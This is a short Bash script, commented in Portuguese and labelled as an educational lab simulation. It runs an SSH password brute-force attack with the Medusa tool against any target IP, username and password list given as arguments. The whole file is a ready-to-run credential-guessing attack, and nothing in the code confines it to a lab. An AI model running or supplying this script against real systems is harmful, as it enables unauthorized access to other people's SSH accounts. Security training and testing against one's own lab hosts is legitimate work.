#!/bin/bash
# ============================================================
# Script de Simulação de Ataque Brute Force com Medusa
# Uso educacional e em laboratório controlado
# ============================================================

if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <IP_ALVO> <USUARIO> <LISTA_SENHAS>"
    echo "Exemplo: $0 192.168.0.10 admin passwords.txt"
    exit 1
fi

IP_ALVO=$1
USUARIO=$2
LISTA_SENHAS=$3

echo "==============================================="
echo " Simulação de Brute Force com Medusa"
echo " Alvo: $IP_ALVO"
echo " Usuário: $USUARIO"
echo " Lista de senhas: $LISTA_SENHAS"
echo "==============================================="

medusa -h $IP_ALVO -u $USUARIO -P $LISTA_SENHAS -M ssh

echo "==============================================="
echo " Simulação concluída!"
echo "==============================================="
